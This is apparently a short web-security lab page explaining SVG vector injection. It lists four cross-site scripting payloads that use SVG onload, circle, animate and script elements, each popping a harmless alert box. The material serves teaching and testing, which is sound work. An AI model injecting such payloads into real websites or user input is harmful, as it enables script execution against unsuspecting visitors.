📚 Lab 8.1.C: SVG Vector Injection

SVG is a vector graphics format that supports event handlers. When you inject an SVG tag, the onload event fires automatically as soon as the element is rendered.

💡 SVG Injection Techniques:

Basic onload:

<svg onload=alert('SVG Loaded')>

Nested element injection:

<svg><circle cx=50 cy=50 r=40 onload=alert('XSS')/></svg>

Animate injection:

<svg><animate onload="alert('Animated XSS')"></svg>

Script within SVG:

<svg><script>alert('SVG Script')</script></svg>
